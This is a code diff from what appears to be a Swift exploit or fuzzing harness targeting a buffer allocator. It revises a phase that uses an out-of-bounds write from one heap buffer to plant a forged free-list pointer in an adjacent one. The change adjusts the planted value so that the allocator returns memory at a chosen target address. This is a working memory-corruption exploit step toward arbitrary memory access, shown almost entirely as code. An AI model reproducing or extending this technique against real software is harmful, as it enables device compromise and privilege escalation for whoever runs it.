@@ -256,22 +256,23 @@ func runAllocatorConfusion(log: FuzzLog, completion: @escaping () -> Void) {
         }
         step("  ptr-class values found: \(foundPtrs)")
 
-        // Phase 4: plant fake free-list entry — write h2's VA into h1's first 8 bytes
-        step("── Planting fake free-list → target va2=0x\(String(va2,radix:16))")
-        // Write va2 as little-endian 8 bytes at h1 offset 0 (via h0 OOB)
-        var target = va2
+        // Phase 4: plant fake free-list entry
+        // OBSERVED: allocator reads planted ptr and subtracts actual_size before returning.
+        // returned = planted - actual → to land AT va2, plant va2 + actual.
+        let plantTarget = va2 + UInt(actual)
+        step("── Planting fake free-list → plant=0x\(String(plantTarget,radix:16)) (va2+actual) target va2=0x\(String(va2,radix:16))")
+        var target = plantTarget
         for i in 0..<8 {
             p0[actual + i] = UInt8(target & 0xFF)
             target >>= 8
         }
-        // Also write it at offset 8, 16, 24 — cover multiple free-list formats
-        target = va2
+        target = plantTarget
         for i in 8..<32 {
             p0[actual + i] = UInt8(target & 0xFF)
             target >>= 8
-            if i % 8 == 7 { target = va2 }
+            if i % 8 == 7 { target = plantTarget }
         }
-        step("  planted va2 at h1[0..31] via h0 OOB")
+        step("  planted va2+actual at h1[0..31] via h0 OOB")
 
         // Phase 5: trigger allocator — call makeBuffer on corrupted h1
         step("── h1.makeBuffer(256) with corrupted state")
